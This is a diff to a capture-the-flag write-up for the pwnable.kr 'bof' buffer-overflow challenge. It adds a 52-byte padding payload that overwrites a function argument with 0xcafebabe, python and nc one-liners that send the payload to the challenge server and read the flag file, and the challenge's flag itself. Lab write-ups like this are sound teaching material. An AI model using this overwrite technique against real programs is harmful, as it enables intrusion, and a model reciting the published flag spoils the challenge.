@@ -87,10 +87,21 @@ See the $ebp and the beginning of overflowme buffer:
 
 
 6. Now we have to override `0xdeadbeef` from `key` input fuction parameter with `0xcafebabe`  which is stored at `$ebp+0x8`.
-Number of bytes to be put into gets function: `0x8 + 0x2c = 8 + 44 = 52` where next bytes should be `0xcafebabe`.
+Number of bytes to be put into gets function: `0x8 + 0x2c = 8 + 44 = 52` where next 4 bytes should be `0xcafebabe` as shown below:
+```FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\xbe\xba\xfe\xca```
+```
+$ python -c "print('F'*52+'\xbe\xba\xfe\xca')" > input 
+$ (cat input && cat) | nc pwnable.kr 9000
+
+or 
+
+$ (python -c "print('F'*52+'\xbe\xba\xfe\xca')";cat) | nc pwnable.kr 9000
+$ cat flag 
+daddy, I just pwned a buFFer :)
+```
 
 
 You'll get the flag:  
 ```
-FLAG: {}
+FLAG: {daddy, I just pwned a buFFer :)}
 ```
